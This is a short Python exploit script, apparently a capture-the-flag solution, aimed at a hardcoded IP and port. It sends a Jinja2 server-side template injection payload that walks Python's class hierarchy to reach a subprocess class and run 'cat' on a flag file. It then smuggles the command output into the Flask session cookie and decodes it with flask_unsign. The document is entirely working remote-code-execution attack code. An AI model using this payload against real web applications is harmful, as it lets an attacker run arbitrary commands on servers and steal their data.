import flask_unsign
import requests
import time
URL="http://178.62.54.33:31649/"
session = requests.session()
response = session.get(URL + "?command=cat&arg=flag_P54ed&leader=leader&name={%+if session.update({request.args.leader:1.__class__.__mro__[1].__subclasses__()[258]([request.args.command, request.args.arg],stdout=-1).communicate()}) %}yay{% endif %}")
payload = session.cookies.get_dict()['session']
decoded = flask_unsign.decode(payload)['leader'][0].decode("utf-8")
print(decoded)


